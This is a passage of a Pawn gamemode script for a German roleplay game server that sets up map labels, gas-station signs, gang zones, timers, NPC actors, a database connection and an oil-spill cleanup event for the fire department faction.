	LabelPD = Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um das Tor zu öffnen", -1, 1576.5586,-9462.2139,6.5909, 20, 0); //LSPD GATE
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um das Tor zu öffnen", -1, 6508.5796, -8011.4941, 1.1523, 5, 0); //sfbanktor
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um Produkte zu nehmen", -1, 3362.6692,-8589.4004,4.3878, 20, 0); //labelprodukte
	Create3DTextLabel("{FAFAFA}Hier kannst du {FF5A00}/wuerfeln", -1, 3722.8711, -9324.9697, 3.9576, 5, 0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um die Bombe zu klauen",0xFFFFFF,4578.9688,-8680.8232,4.5,1,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,1758.7925,-9193.3594,5.8379,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,1837.4330,-9248.7168,5.4142,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,6385.7114,-7761.1987,5.3729,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,1772.8489,-9325.0684,5.4142,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,1613.8613,-9331.1709,7.5968,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,1559.0200,-9498.0225,8.1537,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,1595.0736,-8551.7588,3.3310,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,1592.7563,-8441.5039,3.3310,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,1595.4391,-8443.8809,8.0640,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,6417.9106,-7750.2256,5.3636,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,6504.7998,-7872.9316,5.6186,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,6576.4126,-7799.0088,5.4096,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,3707.7617,-8906.2822,52.5087,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,1698.0477,-9212.2695,5.4040,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,6419.3608,-9143.6748,5.4041,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,6592.4160,-7879.9326,4.4086,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,6303.6919,-7829.6938,4.4152,10.0,0,0);
    Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um Öl abzupumpen",0xFFFFFF,2989.3435,-8750.3311,4.7994,7.0,0,0);


	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} für den Startbonus",0xFFFFFF,1831.2838,-9262.2881,5.3860,10.0,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} für den Startbonus",0xFFFFFF,6379.5640,-7724.7202,5.3759,10.0,0,0);


	//Tankstellen

	Tankstelle1 = CreateDynamicObjectEx(5811, 2448.37427, -9309.20215, 7.23664,   0.00000, 0.00000, 90.00000, 300.00, 300.00);
	SetDynamicObjectMaterialText(Tankstelle1, 1, "www.county-islands.com", 90, "Arial", 24, 1, 0xFFD78E10, 0xFF221918, 1);
	SetDynamicObjectMaterialText(Tankstelle1, 2, "Diesel: 0.91$", 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF2D3A35, 1);
	SetDynamicObjectMaterialText(Tankstelle1, 3,"Benzin: 1.10$", 90, "Arial", 24, 0, 0xFFFFFFFF, 0xFF193826, 1);
	SetDynamicObjectMaterialText(Tankstelle1, 4,"Besitzer: Der Staat", 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF635C5A, 1);
	SetDynamicObjectMaterialText(Tankstelle1, 5,"Tankstelle\nLake Sorten", 90, "Arial", 40, 1, 0xFFFFFFFF, 0xFF221918, 1);


	Tankstelle2 = CreateDynamicObjectEx(5811, 5366.94434, -9288.53516, 7.48057,   0.00000, 0.00000, 90.00000, 300.00, 300.00);//Lake Vortex tankstell
	SetDynamicObjectMaterialText(Tankstelle2,1, "www.county-islands.com", 90, "Arial", 24, 1, 0xFFD78E10, 0xFF221918, 1);
	SetDynamicObjectMaterialText(Tankstelle2, 2, "Diesel: 0.91$", 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF2D3A35, 1);
	SetDynamicObjectMaterialText(Tankstelle2, 3,"Benzin: 1.10$", 90, "Arial", 24, 0, 0xFFFFFFFF, 0xFF193826, 1);
	SetDynamicObjectMaterialText(Tankstelle2, 4,"Besitzer: Der Staat", 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF635C5A, 1);
	SetDynamicObjectMaterialText(Tankstelle2, 5,"Tankstelle\nLake Vortex", 90, "Arial", 40, 1, 0xFFFFFFFF, 0xFF221918, 1);

	Tankstelle3 = CreateDynamicObjectEx(5811, 6326.05273, -7845.52051, 7.28421,   0.00000, 0.00000, 90.00000, 300.00, 300.00);//Santa Felton tankstelle
	SetDynamicObjectMaterialText(Tankstelle3,1, "www.county-islands.com", 90, "Arial", 24, 1, 0xFFD78E10, 0xFF221918, 1);
	SetDynamicObjectMaterialText(Tankstelle3, 2, "Diesel: 0.91$", 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF2D3A35, 1);
	SetDynamicObjectMaterialText(Tankstelle3, 3,"Benzin: 1.10$", 90, "Arial", 24, 0, 0xFFFFFFFF, 0xFF193826, 1);
	SetDynamicObjectMaterialText(Tankstelle3, 4,"Besitzer: Der Staat", 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF635C5A, 1);
	SetDynamicObjectMaterialText(Tankstelle3, 5,"Tankstelle\nSanta Felton", 90, "Arial", 40, 1, 0xFFFFFFFF, 0xFF221918, 1);


	/////////////////////////////////////    3722.8711, -9324.9697, 3.9576

	for(new i=0;i<MAX_VEHICLES;i++)
    {
        Blink[i][0] = -1;
        Blink[i][1] = -1;
        Blink[i][2] = -1;
        Blink[i][3] = -1;
    }
    SetWeather(5);
    ShowPlayerMarkers(PLAYER_MARKERS_MODE_OFF);
    DisableInteriorEnterExits();
	EnableStuntBonusForAll(false);
	ManualVehicleEngineAndLights();

	dbhandle = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_DATA, MYSQL_PASS);
	if(mysql_errno() != 0)
 	{
		print("Verbindung zu MySql Datenbank fehlgeschlagen!");
		print("Stoppe Server!");
		SendRconCommand("exit");
	}
	else print("Mysql Erfolgreich verbunden");
	printf("Db handle %i", dbhandle);

	//printf("User: %i", cache_num_rows());

	SetTimer("Update",1000,1);
	SetTimer("Hausladen",2000,0);
	SetTimer("PoliceLightFlash",500,1);
 	SetTimer("B_TrailerCheck", 1000, 1);
	SetTimer("MysqlSend",10800000,1);
    TextDraws();
	Objecte();
	new rand = random  (30) + 20;
	SetTimer("FeuerEntfachen",1000*60*rand,0);
	SetTimer("Oelspur",1000*60*6,0);
	FrakAutosladen();
	Blitzerladen();
	fraklagerladen();
	GangwarZonenLaden();

	//fläche industrie
	industrie9 = GangZoneCreate(2652.9531,-9195.7920, 2736.6780,-7906.6948);
	industrie10 = GangZoneCreate(2736.3037,-8953.2646, 3500.4861,-8334.8564);
	industrie11 = GangZoneCreate(2710.6367,-8059.1221, 4316.0425,-7894.0728);
	industrie12 = GangZoneCreate(2733.3738,-8355.4668, 3064.6245,-8057.3623);
	//Straßen industrie

	LSHaupt = GangZoneCreate(1464.0581,-9591.7227, 1862.5438,-9254.2285);//Lake Sorten - Hauptstrasse
	BSN2 = GangZoneCreate(1539.6525,-9262.8555, 1865.1201,-9119.2676);//Lake Sorten - Eatstreet
	StrasseLSklein1 = GangZoneCreate(1759.7714,-9126.3223, 1861.7659,-8663.9023);
	BallasLS1 = GangZoneCreate(1540.4849,-8926.2676, 1861.7659,-8663.9023);
	BallasLS2 = GangZoneCreate(1684.1715,-8990.2813, 1783.9645,-8885.5830);
	Street_Noobspawn1 = GangZoneCreate(1684.1715,-8990.2813, 1783.9645,-8885.5830);
	Street_Noobspawn2 = GangZoneCreate(1616.7252,-8682.0205, 1703.0110,-7449.4238);
	Spawn1 = GangZoneCreate(1536.6595,-8645.6553, 1645.4722,-8350.8184);
	DonatorIsland1 = GangZoneCreate(1620.8353,-8027.9126, 1825.3307,-7453.0234);
	Autobahn1 = GangZoneCreate( 1794.8147,-7906.5327, 6311.3965,-7802.5327);
	Portlandstreet1 = GangZoneCreate(4292.1445,-7826.4146, 4377.7456,-7717.7500);
	Portland1 = GangZoneCreate(4137.5322,-7740.1724, 4532.3423,-7515.3281);
	Bergstreet = GangZoneCreate(4294.4521,-9237.5420, 4374.5298,-7871.9893);
	SF1 = GangZoneCreate(6290.9336,-8022.2759, 6644.0898,-7667.9985);
	LV_SF = GangZoneCreate(6294.9634,-8785.0996, 6441.1353,-7960.4346);
	SF_LV = GangZoneCreate(6291.8569,-9142.2266, 6439.7388,-8870.5010);
	LV1 = GangZoneCreate(6289.9243,-9483.8750, 6516.9600,-9115.4580);
	LS_Street = GangZoneCreate(1846.8475,-9399.9980, 6310.3315,-9196.5654);
	Bergland = GangZoneCreate(3965.9734,-8588.7490, 4319.9199,-8304.7178);
	Bergland2 = GangZoneCreate(3761.7280,-9237.1729,4298.3730,-8392.4287);
	LSStrasse1 = GangZoneCreate(1502.6530,-9556.4268,1517.2032,-9291.759);
	LSStrasse2 = GangZoneCreate(1502.6530,-9305.6436,1581.1349,-9291.759);
	kleinparkplatz1 = GangZoneCreate(1580.0874,-9556.1904,1594.8112,-9151.5742);
	LSPDStrasse3 = GangZoneCreate(1516.2085,-9556.5068,1827.1550,-9542.3486);
	LSLV1 = GangZoneCreate(1580.1534,-9306.1514,6482.0337,-9292.3545);
	Wohnhauser1 = GangZoneCreate(1594.0542,-9445.7285,1783.8843,-9431.8350);
	HauptS1 = GangZoneCreate(1782.6470,-9556.2568,1796.9243,-8729.1455);
	HauptS2 = GangZoneCreate(1812.3328,-9556.5664,1826.9237,-8699.4365);
	BSN1 = GangZoneCreate(1826.9728,-9151.7764,1580.0701,-9166.4502);
	Kreuzung1 = GangZoneCreate(1782.8558,-9026.0527,1826.9819,-9011.8076);
	Kreuzung2 = GangZoneCreate(1580.1007,-8886.3389,1827.0316,-8871.7646);
	Ballas1 = GangZoneCreate(1580.1007,-8886.3389,1594.8171,-8699.3350);
	Ballas2 = GangZoneCreate(1594.8171,-8714.0801,1827.1027,-8699.3350);
	Ballas3 = GangZoneCreate(1580.3903,-8743.7422,1797.1704,-8729.1963);
	Ballas4 = GangZoneCreate(1705.0114,-8834.8125,1719.6448,-8742.8027);
	WrongHillStr1 = GangZoneCreate(4327.6099,-9305.9766,4341.4302,-7690.2651);
	WrongHolle1 = GangZoneCreate(4202.7998,-8557.2168,4341.4604,-8543.6621);
	GangStrasseHaupt1 = GangZoneCreate(4172.6665,-7704.0391,4496.3262,-7690.3154);
	GangstrasseLinks1 = GangZoneCreate(4483.0576,-7703.4707,4495.8916,-7550.1631);
	GangstrasseHInten1 = GangZoneCreate(4172.6021,-7564.2197,4496.8574,-7550.0278);
	GangstrasseRechts1 = GangZoneCreate(4172.5542,-7703.6528,4186.4268,-7550.0928);
	GangstrasseMitteLinks1 = GangZoneCreate(4313.0444,-7704.6602,4326.0830,-7550.5698);
	GangstrasseMitteRechts1 = GangZoneCreate(4342.5083,-7701.2148,4356.0356,-7550.5371);
	LVSFStrasse1 = GangZoneCreate(6327.5229,-9445.6855,6341.6875,-7707.5459);
	LVStrasse = GangZoneCreate(6326.8750,-9166.1436,6481.4272,-9152.5400);
	LVStrasseganzhinten1 = GangZoneCreate(6467.5166,-9445.9785,6481.0884,-9151.6289);
	LVStrassehintenfw1 = GangZoneCreate(6327.7524,-9445.4189,6481.3193,-9432.0020);
	SFWohnStrasse1 = GangZoneCreate(6341.0425,-7938.4829,6481.0591,-7924.6680);
	Hauptstrasselang1SF = GangZoneCreate(6467.8218,-7938.4829,6481.0591,-7707.7344);
	HauptstrassekurzSF1 = GangZoneCreate(6496.8638,-7860.8955,6510.4424,-7707.6382);
	SFStrassehinten1 = GangZoneCreate(6327.6709,-7721.7979,6650.5220,-7708.0146);
	MullSF1 = GangZoneCreate(6636.5771,-7860.8335,6651.3735,-7707.7280);
	SFAutobahnstr1 = GangZoneCreate(6204.8931,-7860.8306,6651.2632,-7847.2148);
	LSzurKurve1 = GangZoneCreate(1652.6743,-8702.0537,1666.2147,-7968.7153);
	EckeVergessen1 = GangZoneCreate(1794.4995,-9445.8594,1814.5458,-9432.2480);
	EckeVergessen2 = GangZoneCreate(1762.1633,-7873.6841,1776.4724,-7484.2881);
	Autobahnsure1 = GangZoneCreate(1774.1558,-7874.3340,6205.3306,-7829.8916);
	Spawnstrasse1 = GangZoneCreate(1653.5099,-8701.4326,1665.9143,-7968.9717);
	Armybase = GangZoneCreate(4342.5879,-8833.3047,4923.9170,-8511.0537);
	Armystrasse = GangZoneCreate(4341.4937,-8557.2598,4710.9214,-8543.3486);
	EventHouse = GangZoneCreate(6369.0293,-7702.1821,6687.8267,-7424.2891);
	EventStrasse = GangZoneCreate(6467.5996,-7708.0366, 6481.3955,-7567.3862);
	LVAirfieldStreeet1 = GangZoneCreate(6291.8013,-9986.1748,6511.6758,-9451.9336);
    LVAirfieldStreeet2 = GangZoneCreate(5649.9795,-10006.0410,6312.2944,-9777.0107);
    LVAirfieldStreeet3 = GangZoneCreate(5921.7622,-9855.2461,6145.3979,-9635.9688);
    StreetLV1 = GangZoneCreate(6327.4370,-9835.4707,6341.1768,-9445.4658);
    StreetLV3 = GangZoneCreate(5945.3130,-9836.0537,6467.4893,-9822.1748);
    StreetLV4 = GangZoneCreate(5945.5664,-9822.0342,5959.2046,-9681.9941);
    StreetLV5 = GangZoneCreate(5945.2778,-9696.0117,6099.3047,-9681.5801);
    StreetLV6 = GangZoneCreate(6085.4712,-9835.8750,6099.3047,-9696.0117);
    industrie1 = GangZoneCreate(3323.2397,-8371.6992,3477.7952,-8358.1152);
	industrie2 = GangZoneCreate(3072.1565,-8511.6182,3464.1497,-8498.2119);
	industrie3 = GangZoneCreate(3058.8335,-8792.8594,3073.4915,-8498.2656);
	industrie4 = GangZoneCreate(2701.0630,-8792.8779,3060.0249,-8777.7832);
	industrie5 = GangZoneCreate(2687.3416,-9292.7119,2702.3125,-7873.6382);//Industrie1
	industrie6 = GangZoneCreate(3072.1411,-8652.8350, 3477.7317,-8638.0703);
	industrie7 = GangZoneCreate(3464.0718,-8638.0732, 3477.7278,-8371.8457);
	industrie8 = GangZoneCreate(3323.5364,-8639.3945, 3338.3354,-8371.7441);
	Flughafenzone = GangZoneCreate(5957.0649,-9894.6064, 6452.9404,-9854.7949);
	/*for(new x = 0; x < 5; x++)
	{
	    GWInfo[x][GWZone] = GangZoneCreate(GWInfo[x][GWmX], GWInfo[x][GWmY], GWInfo[x][GWMX], GWInfo[x][GWMY]);
	}*/
	GWInfo[0][GWZone] = GangZoneCreate(GWInfo[0][GWmX], GWInfo[0][GWmY], GWInfo[0][GWMX], GWInfo[0][GWMY]);
	GWInfo[1][GWZone] = GangZoneCreate(GWInfo[1][GWmX], GWInfo[1][GWmY], GWInfo[1][GWMX], GWInfo[1][GWMY]);
	GWInfo[2][GWZone] = GangZoneCreate(GWInfo[2][GWmX], GWInfo[2][GWmY], GWInfo[2][GWMX], GWInfo[2][GWMY]);
	GWInfo[3][GWZone] = GangZoneCreate(GWInfo[3][GWmX], GWInfo[3][GWmY], GWInfo[3][GWMX], GWInfo[3][GWMY]);
	GWInfo[4][GWZone] = GangZoneCreate(GWInfo[4][GWmX], GWInfo[4][GWmY], GWInfo[4][GWMX], GWInfo[4][GWMY]);
	SetGameModeText("German Reallife 1.5b");
	SendRconCommand("County Islands | (CLOSED BETA) ");
	return 1;
}
//Blinker
forward B_OnTrailerDetached(trailerid, fromvehicleid);
forward B_OnTrailerAttached(trailerid, tovehicleid);
forward B_TrailerCheck();
forward B_DisableBlinks(vehicleid);
new oelspuraktiv[3] = 0;
new Float:oelx[3],Float:oely[3],Float:oelz[3];
new oelobject[3];
forward Oelspur();
public Oelspur()
{
	new randx = random(30)+20;
    SetTimer("Oelspur",1000*60*randx,0);
	new rand = random(sizeof(Oelspuren));
	if(oelspuraktiv[0] == 0)
	{
	    oelspuraktiv[0] = 1;
		oelx[0] = Oelspuren[rand][0];
		oely[0] = Oelspuren[rand][1];
		oelz[0] = Oelspuren[rand][2];
		oelobject[0] = CreateDynamicObjectEx(19898,oelx[0],oely[0],oelz[0],0,0,0,250,250);
		FraktionsNachricht(4,COLOR_HQ,"HQ: Es gab einen Unfall. Bitte beseitigen Sie die Ölspur!");
    	FraktionsNachricht(3,COLOR_HQ,"HQ: Es gab einen Unfall. Bitte beseitigen Sie die Ölspur!");
	}
	else if(oelspuraktiv[1] == 0)
	{
	    oelspuraktiv[1] = 1;
		oelx[1] = Oelspuren[rand][0];
		oely[1] = Oelspuren[rand][1];
		oelz[1] = Oelspuren[rand][2];
		oelobject[1] = CreateDynamicObjectEx(19898,oelx[1],oely[1],oelz[1],0,0,0,250,250);
		FraktionsNachricht(4,COLOR_HQ,"HQ: Es gab einen Unfall. Bitte beseitigen Sie die Ölspur!");
    	FraktionsNachricht(3,COLOR_HQ,"HQ: Es gab einen Unfall. Bitte beseitigen Sie die Ölspur!");
	}
	else if(oelspuraktiv[2] == 0)
	{
	    oelspuraktiv[2] = 1;
		oelx[2] = Oelspuren[rand][0];
		oely[2] = Oelspuren[rand][1];
		oelz[2] = Oelspuren[rand][2];
		oelobject[2] = CreateDynamicObjectEx(19898,oelx[2],oely[2],oelz[2],0,0,0,250,250);
		FraktionsNachricht(4,COLOR_HQ,"HQ: Es gab einen Unfall. Bitte beseitigen Sie die Ölspur!");
    	FraktionsNachricht(3,COLOR_HQ,"HQ: Es gab einen Unfall. Bitte beseitigen Sie die Ölspur!");
	}
}

cmd:bindemittel(playerid,params[])
{
	if(SpielerInfo[playerid][uLeiter] == 3 || SpielerInfo[playerid][uLeiter] == 4 || SpielerInfo[playerid][uMitglied] == 3 || SpielerInfo[playerid][uMitglied] == 4)
	{
		if(IsPlayerInRangeOfPoint(playerid,4,oelx[0],oely[0],oelz[0]) && oelspuraktiv[0] == 1)
		{
		    oelspuraktiv[0] = 2;
			SetTimer("Spurentfernen1",1000*60*5,0);
			SendClientMessage(playerid,COLOR_GREEN,"Bindemittel eingesetzt! Sperre den Bereich ab und warte bis das Bindemittel gewirkt hat!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,oelx[1],oely[1],oelz[1]) && oelspuraktiv[1] == 1)
		{
		    oelspuraktiv[1] = 2;
			SetTimer("Spurentfernen2",1000*60*5,0);
			SendClientMessage(playerid,COLOR_GREEN,"Bindemittel eingesetzt! Sperre den Bereich ab und warte bis das Bindemittel gewirkt hat!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,oelx[2],oely[2],oelz[2]) && oelspuraktiv[2] == 1)
		{
		    oelspuraktiv[2] = 2;
			SetTimer("Spurentfernen3",1000*60*5,0);
			SendClientMessage(playerid,COLOR_GREEN,"Bindemittel eingesetzt! Sperre den Bereich ab und warte bis das Bindemittel gewirkt hat!");
		}
		else
		{
		    SendClientMessage(playerid,COLOR_RED,"Du befindest dich an keiner Ölspur!");
		}
	}
	else
	{
	    SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
	}
	return 1;
}
forward Spurentfernen1();
public Spurentfernen1()
{
    oelspuraktiv[0] = 0;
    DestroyDynamicObject(oelobject[0]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerInRangeOfPoint(i,40.0,oelx[0],oely[0],oelz[0]) && IstSpielerInFrak(i,4) || IstSpielerInFrak(i,3))
	    {
	        GebeGeld(i,400);
	        SendClientMessage(i,COLOR_GREEN,"400$ Belohnung erhalten für das Entfernen einer Ölspur.");
	    }
	}
    FraktionsNachricht(4,COLOR_HQ,"HQ: Das Bindemittel hat die Ölspur aufgesaugt. Die Sperre kann entfernt werden!");
   	FraktionsNachricht(3,COLOR_HQ,"HQ: Das Bindemittel hat die Ölspur aufgesaugt. Die Sperre kann entfernt werden!");
   	oelx[0] = 0;
	oely[0] = 0;
	oelz[0] = 0;
}
forward Spurentfernen2();
public Spurentfernen2()
{
    oelspuraktiv[1] = 0;
    DestroyDynamicObject(oelobject[1]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerInRangeOfPoint(i,40.0,oelx[1],oely[1],oelz[1]) && IstSpielerInFrak(i,4) || IstSpielerInFrak(i,3))
	    {
	        GebeGeld(i,400);
	        SendClientMessage(i,COLOR_GREEN,"400$ Belohnung erhalten für das Entfernen einer Ölspur.");
	    }
	}
	FraktionsNachricht(4,COLOR_HQ,"HQ: Das Bindemittel hat die Ölspur aufgesaugt. Die Sperre kann entfernt werden!");
   	FraktionsNachricht(14,COLOR_HQ,"HQ: Das Bindemittel hat die Ölspur aufgesaugt. Die Sperre kann entfernt werden!");
   	oelx[1] = 0;
	oely[1] = 0;
	oelz[1] = 0;
}
forward Spurentfernen3();
public Spurentfernen3()
{
    oelspuraktiv[2] = 0;
    DestroyDynamicObject(oelobject[2]);
    FraktionsNachricht(4,COLOR_HQ,"HQ: Das Bindemittel hat die Ölspur aufgesaugt. Die Sperre kann entfernt werden!");
   	FraktionsNachricht(14,COLOR_HQ,"HQ: Das Bindemittel hat die Ölspur aufgesaugt. Die Sperre kann entfernt werden!");
   	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerInRangeOfPoint(i,40.0,oelx[2],oely[2],oelz[2]) && IstSpielerInFrak(i,4) || IstSpielerInFrak(i,3))
	    {
	        GebeGeld(i,400);
	        SendClientMessage(i,COLOR_GREEN,"400$ Belohnung erhalten für das Entfernen einer Ölspur.");
	    }
	}
	oelx[2] = 0;
	oely[2] = 0;
	oelz[2] = 0;
}
cmd:spuren(playerid,params[])
{
	if(SpielerInfo[playerid][uLeiter] == 3 || SpielerInfo[playerid][uLeiter] == 4 || SpielerInfo[playerid][uMitglied] == 4 || SpielerInfo[playerid][uMitglied] == 3)
	{
	    if(oelspuraktiv[0] == 1)
	 	{
	 	    SetPlayerCheckpoint(playerid,oelx[0],oely[0],oelz[0],5.0);
	 	    cpaktiv[playerid] = 1;
	 	    SendClientMessage(playerid,COLOR_GREEN,"Checkpoint gesetzt!");
	 	}
	 	else if(oelspuraktiv[1] == 1)
	 	{
	 	    SetPlayerCheckpoint(playerid,oelx[1],oely[1],oelz[1],5.0);
	 	    cpaktiv[playerid] = 1;
	 	    SendClientMessage(playerid,COLOR_GREEN,"Checkpoint gesetzt!");
	 	}
	 	else if(oelspuraktiv[2] == 1)
	 	{
	 	    SetPlayerCheckpoint(playerid,oelx[2],oely[2],oelz[2],5.0);
	 	    cpaktiv[playerid] = 1;
	 	    SendClientMessage(playerid,COLOR_GREEN,"Checkpoint gesetzt!");
	 	}
	 	else
	 	{
	 	    SendClientMessage(playerid,COLOR_RED,"Es gibt momentan keine Ölspur!");
	 	}
	}
	else
	{
	    SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
	}
	return 1;
}
forward Hausladen();
public Hausladen()
{
    HaeuserBizzLaden();
    Bizzesladen();
    Autohausladen();
    Frakrangladen();
   	server_actors[0]=CreateActor(205,1758.7925,-9193.3594,4.8379,265.6858);//BSN Actor
	server_actors[1]=CreateActor(9,1837.4330,-9248.7168,4.4142,202.9952);//Stadthalle 1 Actor
	server_actors[2]=CreateActor(194,6385.7114,-7761.1987,4.3729,99.3510);//Stadthalle 2 Actor
	server_actors[3]=CreateActor(211,1772.8489,-9325.0684,4.4142,4.9666);//Shop Actor
	server_actors[4]=CreateActor(37,1613.8613,-9331.1709,6.5968,174.7950);//Shop Actor 2&//
	server_actors[5]=CreateActor(266,1559.0200,-9498.0225,7.1537,181.1084);//LS Cop 1//
	server_actors[6]=CreateActor(11,1595.0736,-8551.7588,2.3310,265.7327);//LS Bank
	server_actors[7]=CreateActor(191,1592.7563,-8441.5039,2.3310,267.6127);//Ammu
	server_actors[8]=CreateActor(210,1595.4391,-8443.8809,7.0640,336.5233);//Fahrschule//
	server_actors[9]=CreateActor(171,6417.9106,-7750.2256,4.3636,21.3444);//Bank2//
	server_actors[10]=CreateActor(311,6504.7998,-7872.9316,4.6186,86.8318);//SF Police//
	server_actors[11]=CreateActor(44,6576.4126,-7799.0088,4.4096,95.6052);//SF Autohaus
	server_actors[12]=CreateActor(155,6592.4756,-7881.4741,4.4086,1.2911);//PizzaBoy1
	server_actors[13]=CreateActor(7,6351.5728,-9504.5996,4.5766,197.4743);//Manuel LV
	server_actors[14]=CreateActor(72,1698.0477,-9212.2695,4.4040,48.5437);//Dru.Verkä.
	server_actors[15]=CreateActor(189,6419.3608,-9143.6748,4.4041,177.3249);//LVSHop
	server_actors[16]=CreateActor(209,6451.4619,-8141.5786,4.4018,197.4743);//Fischmarkt
	server_actors[17]=CreateActor(8,2667.5776,-8788.3105,6.3,276.6536);//WART
	server_actors[18]=CreateActor(135,3707.8311,-8906.0469,51.5093,318.2002);//Schwarmarkt
	server_actors[19]=CreateActor(14 ,6303.6919,-7829.6938,4.4152,267.4415);//SF Tankstellentyp
	server_actors[20]=CreateActor(264 ,1831.2838,-9262.2881,4.3860,235.5251);//Startbonus
	server_actors[21]=CreateActor(264 ,6379.5640,-7724.7202,4.3759,167.8678);//Startbonus



	ApplyActorAnimation(server_actors[1],"PED","SEAT_IDLE",4.1, 1, 0, 0, 1, 0);
	ApplyActorAnimation(server_actors[2],"PED","SEAT_IDLE",4.1, 1, 0, 0, 1, 0);
	ApplyActorAnimation(server_actors[13],"PED","SEAT_IDLE",4.1, 1, 0, 0, 1, 0);
	ApplyActorAnimation(server_actors[8],"PED","SEAT_IDLE",4.1, 1, 0, 0, 1, 0);
	ApplyActorAnimation(server_actors[9],"PED","SEAT_IDLE",4.1, 1, 0, 0, 1, 0);
	ApplyActorAnimation(server_actors[11],"PED","SEAT_IDLE",4.1, 1, 0, 0, 1, 0);
	ApplyActorAnimation(server_actors[5],"PED","SEAT_IDLE",4.1, 1, 0, 0, 1, 0);
	ApplyActorAnimation(server_actors[18],"PED","SEAT_IDLE",4.1, 1, 0, 0, 1, 0);

	CreateActor(60,6465.2886,-7625.7285,4.4096,181.9534);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,6465.2886,-7625.7285,4.4096,10.0,0,0);

	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,6451.4619,-8141.5786,4.4018,10.0,0,0);
}
public OnGameModeExit()
{
	fraklagerspeichern();
	Blitzerspeichern();
	Frakrangspeichern();
    for(new i=0;i<MAX_VEHICLES;i++) DisableCarBlinking(i);
    /*for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uEingeloggt] == 1)
	    {
	    	AccountSpeichern(i);
	    }
	}*/
	return 1;
}
//forward OnIncomingConnection(playerid, ip_address[], port);//

forward OnLightFlash(vehicleid);//flashlight

public OnPlayerConnect(playerid)
{
    //if(strcmp(LastOfflinePlayer,PlayerName(playerid)) && LastOfflineTime <= MinOfflineTime+LastOfflineTime) return SetTimerEx("KICKHIM", 200, false, "d", playerid);
	new connection[80];
	in_event[playerid] = false;
	truckrespawn[playerid] = 0;
	Bankraubgeld[playerid] = 0;
	SpielerInfo[playerid][uStartbonus] = 0;
	SpielerInfo[playerid][uAngelnerlaubt] = 0;
	SpielerInfo[playerid][uAngelnerlaubt2] = 0;
	Bankraubtextdraw[playerid] = 0;
	playersirene[playerid] = 0;
	playerradio[playerid] = 0;
	format(connection,sizeof(connection),"%s[%d]: hat den Server betreten",PlayerName(playerid),playerid);
	SendClientMessageToAll(0x0F9000FF,connection);
    for(new x = 0; x < 2; x++) SAuto[playerid][x][sID] = -1;
	Ticket[playerid] = -1; TicketErsteller[playerid] = -1;
	SpielerInfo[playerid][uPayDaySekunden] = 0;
    kannblitz[playerid] = 0; skinchange[playerid] = 0; wangezeigt[playerid] = 0;
    Userwerben[playerid] = -1;
